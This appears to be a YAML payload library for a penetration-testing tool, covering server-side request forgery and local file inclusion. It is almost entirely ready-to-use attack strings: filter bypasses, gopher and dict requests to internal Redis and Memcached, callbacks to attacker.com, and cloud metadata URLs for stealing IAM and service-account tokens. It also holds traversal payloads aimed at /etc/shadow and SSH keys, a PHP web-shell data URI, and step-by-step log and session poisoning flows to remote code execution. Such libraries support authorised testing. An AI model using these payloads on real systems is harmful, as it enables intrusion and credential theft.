id: ssrf-lfi-payloads
category: payloads
name: SSRF & LFI Payload Library
version: "1.0"
tags:
  - ssrf
  - lfi
  - path_traversal
  - php_wrappers
  - cloud_metadata
  - ip_obfuscation
  - log_poisoning
  - rce
last_updated: "2026-03-26"

description: >
  SSRF and LFI/path traversal payload library. SSRF section covers IP obfuscation
  bypasses, scheme-based techniques, and all major cloud metadata endpoints.
  LFI section covers traversal depth variants, encoding bypasses, null-byte tricks,
  PHP stream wrappers, and log/proc file targets for RCE escalation.
  Use with ssrf_test, injection_test, or http_request for manual testing.

# -----------------------------------------------------------------------
# SSRF PAYLOADS
# -----------------------------------------------------------------------

ssrf:
  localhost_variants:
    description: "Localhost probes — bypass allowlists that block 'localhost' string"
    payloads:
      - "http://127.0.0.1/"
      - "http://localhost/"
      - "http://[::1]/"
      - "http://0/"
      - "http://127.1/"
      - "http://127.0.1/"
      - "http://0.0.0.0/"
      - "http://[0:0:0:0:0:ffff:127.0.0.1]/"
      - "http://[::ffff:127.0.0.1]/"
      - "http://[::ffff:7f00:1]/"

  ip_obfuscation:
    description: "Numeric representation bypasses for 127.0.0.1"
    decimal:
      - "http://2130706433/"
      - "http://2130706433:80/"
    octal:
      - "http://0177.0.0.1/"
      - "http://0177.00.00.01/"
    hex:
      - "http://0x7f000001/"
      - "http://0x7f.0x00.0x00.0x01/"
    mixed:
      - "http://127.0x00.0x00.0x01/"
      - "http://0177.0.0x0.01/"

  dns_rebinding:
    description: "DNS-based bypasses — domain resolves to 127.0.0.1"
    payloads:
      - "http://localtest.me/"
      - "http://127.0.0.1.nip.io/"
      - "http://127.0.0.1.xip.io/"
      - "http://spoofed.burpcollaborator.net/"

  scheme_bypass:
    description: "Alternative URL schemes that may be accepted by the SSRF sink"
    payloads:
      - "file:///etc/passwd"
      - "file:///C:/Windows/win.ini"
      - "dict://127.0.0.1:6379/INFO"
      - "gopher://127.0.0.1:6379/_INFO%0A"
      - "gopher://127.0.0.1:11211/_%0astats%0a"
      - "sftp://attacker.com:11111/"
      - "ldap://attacker.com/a"
      - "tftp://attacker.com:12346/TESTUDPPACKET"

  cloud_metadata:
    aws_imdsv1:
      description: "AWS IMDSv1 — no token required, critical IAM credential exposure"
      endpoints:
        - "http://169.254.169.254/latest/meta-data/"
        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
        - "http://169.254.169.254/latest/user-data/"
        - "http://169.254.169.254/latest/dynamic/instance-identity/document"
        - "http://169.254.169.254/latest/meta-data/hostname"
        - "http://169.254.169.254/latest/meta-data/public-keys/"
    aws_imdsv2:
      description: "AWS IMDSv2 two-step token flow"
      step1: "PUT http://169.254.169.254/latest/api/token  [X-aws-ec2-metadata-token-ttl-seconds: 21600]"
      step2: "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/  [X-aws-ec2-metadata-token: TOKEN]"
    gcp:
      description: "GCP IMDS — requires Metadata-Flavor: Google header"
      required_header: "Metadata-Flavor: Google"
      endpoints:
        - "http://metadata.google.internal/computeMetadata/v1/"
        - "http://metadata.google.internal/computeMetadata/v1/instance/"
        - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        - "http://metadata.google.internal/computeMetadata/v1/project/project-id"
        - "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
    azure:
      description: "Azure IMDS — requires Metadata: true header"
      required_header: "Metadata: true"
      endpoints:
        - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    alibaba_cloud:
      endpoints:
        - "http://100.100.100.200/latest/meta-data/"
        - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
    digitalocean:
      endpoints:
        - "http://169.254.169.254/metadata/v1/"
        - "http://169.254.169.254/metadata/v1/id"
        - "http://169.254.169.254/metadata/v1/user-data"

  internal_services:
    description: "Common internal service ports to probe via SSRF"
    targets:
      - "http://127.0.0.1:22/"
      - "http://127.0.0.1:25/"
      - "http://127.0.0.1:80/"
      - "http://127.0.0.1:443/"
      - "http://127.0.0.1:3306/"
      - "http://127.0.0.1:5432/"
      - "http://127.0.0.1:6379/"
      - "http://127.0.0.1:8080/"
      - "http://127.0.0.1:8443/"
      - "http://127.0.0.1:8500/"
      - "http://127.0.0.1:9200/"
      - "http://127.0.0.1:11211/"
      - "http://127.0.0.1:27017/"
      - "http://127.0.0.1:2375/"
      - "http://127.0.0.1:2379/"

# -----------------------------------------------------------------------
# LFI / PATH TRAVERSAL PAYLOADS
# -----------------------------------------------------------------------

lfi:
  linux_traversal:
    description: "Standard path traversal targeting /etc/passwd — confirm with 'root:x:0:0' in response"
    plain:
      - "../../../etc/passwd"
      - "../../../../etc/passwd"
      - "../../../../../etc/passwd"
      - "../../../../../../etc/passwd"
      - "../../../../../../../etc/passwd"
      - "../../../../../../../../etc/passwd"
    double_dot_slash_bypass:
      - "....//....//....//etc/passwd"
      - "....\/....\/....\/etc/passwd"
    absolute:
      - "/etc/passwd"
      - "/etc/hosts"
      - "/etc/hostname"
      - "/etc/shadow"

  windows_traversal:
    description: "Windows path traversal targeting win.ini — confirm with '[boot loader]' or '[fonts]'"
    plain:
      - "..\\..\\..\\windows\\win.ini"
      - "..\\..\\..\\..\\windows\\win.ini"
      - "../../../../windows/win.ini"
      - "../../../windows/system32/drivers/etc/hosts"
    absolute:
      - "C:\\Windows\\win.ini"
      - "C:/Windows/win.ini"

  encoding_bypasses:
    description: "Encoding variants to evade WAF and path normalisation filters"
    url_encoded:
      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - "..%2F..%2F..%2Fetc%2Fpasswd"
      - "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
    double_url_encoded:
      - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
      - "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
    unicode:
      - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
      - "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini"
    sixteen_bit:
      - "..%u2215..%u2215..%u2215etc%u2215passwd"

  null_byte:
    description: "Null byte injection to truncate appended extensions (legacy PHP, some Java)"
    payloads:
      - "../../../etc/passwd%00"
      - "../../../etc/passwd%00.html"
      - "../../../etc/passwd%00.php"
      - "../../../etc/passwd%2500"
      - "../../../etc/passwd%2500.html"

  php_wrappers:
    description: "PHP stream wrappers — applicable only when the target application is PHP"
    filter_base64:
      description: "Read source code as base64 — avoids issues with special chars"
      payloads:
        - "php://filter/convert.base64-encode/resource=index.php"
        - "php://filter/convert.base64-encode/resource=config.php"
        - "php://filter/convert.base64-encode/resource=../config/database.php"
        - "php://filter/convert.base64-encode/resource=/etc/passwd"
    filter_rot13:
      payloads:
        - "php://filter/read=string.rot13/resource=index.php"
    filter_chain_rce:
      description: "PHP filter chain RCE — no file write required, works on modern PHP"
      note: "Generate chain with https://github.com/synacktiv/php_filter_chain_generator — output is a long php://filter/convert.iconv... URI"
    data_uri:
      description: "Execute PHP from data URI — requires allow_url_include=On"
      payloads:
        - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        - "data://text/plain,<?php system($_GET['cmd']);?>"
    php_input:
      description: "Use POST body as included source — requires allow_url_include=On"
      wrapper: "php://input"
      post_body: "<?php system('id'); ?>"
    phar:
      description: "Trigger deserialization via phar metadata in uploaded file"
      payloads:
        - "phar://uploads/archive.jpg/test"
    zip:
      description: "Include file inside uploaded zip archive"
      payloads:
        - "zip://uploads/archive.zip#shell.php"
    expect:
      description: "Direct command execution — requires expect extension (rare)"
      payloads:
        - "expect://id"
        - "expect://whoami"

  sensitive_linux_files:
    description: "High-value read targets once LFI is confirmed"
    credentials:
      - "/etc/passwd"
      - "/etc/shadow"
      - "/root/.ssh/id_rsa"
      - "/root/.ssh/authorized_keys"
      - "/home/{user}/.ssh/id_rsa"
    application:
      - "/var/www/html/.env"
      - "/var/www/html/config.php"
      - "/app/.env"
      - "/app/config/database.yml"
      - "/opt/app/config.yml"
      - "/etc/nginx/nginx.conf"
      - "/etc/apache2/apache2.conf"
      - "/etc/httpd/conf/httpd.conf"
    proc:
      description: "/proc pseudo-filesystem — always readable without traversal depth limit"
      targets:
        - "/proc/self/environ"
        - "/proc/self/cmdline"
        - "/proc/self/maps"
        - "/proc/self/status"
        - "/proc/version"
        - "/proc/net/tcp"

  log_poisoning:
    description: "LFI to RCE via log file injection — inject PHP payload into a log, then include via LFI"
    target_logs:
      - "/var/log/apache2/access.log"
      - "/var/log/apache2/error.log"
      - "/var/log/nginx/access.log"
      - "/var/log/nginx/error.log"
      - "/var/log/auth.log"
      - "/proc/self/fd/2"
    attack_flow:
      - step: 1
        action: "Poison log with PHP payload via User-Agent header"
        example: "Send any request with User-Agent: <?php system($_GET['cmd']); ?>"
      - step: 2
        action: "Include the log file via the confirmed LFI parameter"
        example: "?page=../../../var/log/apache2/access.log&cmd=id"
      - step: 3
        action: "Confirm RCE — look for uid= output in the HTTP response"
    session_poisoning:
      description: "PHP session file poisoning — inject PHP into session data, then include via LFI"
      session_paths:
        - "/var/lib/php/sessions/sess_{PHPSESSID}"
        - "/tmp/sess_{PHPSESSID}"
        - "/tmp/{PHPSESSID}"
      attack_flow:
        - "Set a session variable to a PHP payload via a normal application request"
        - "Retrieve PHPSESSID from Set-Cookie response header"
        - "Include session file via LFI: ?page=../../../tmp/sess_{PHPSESSID}"
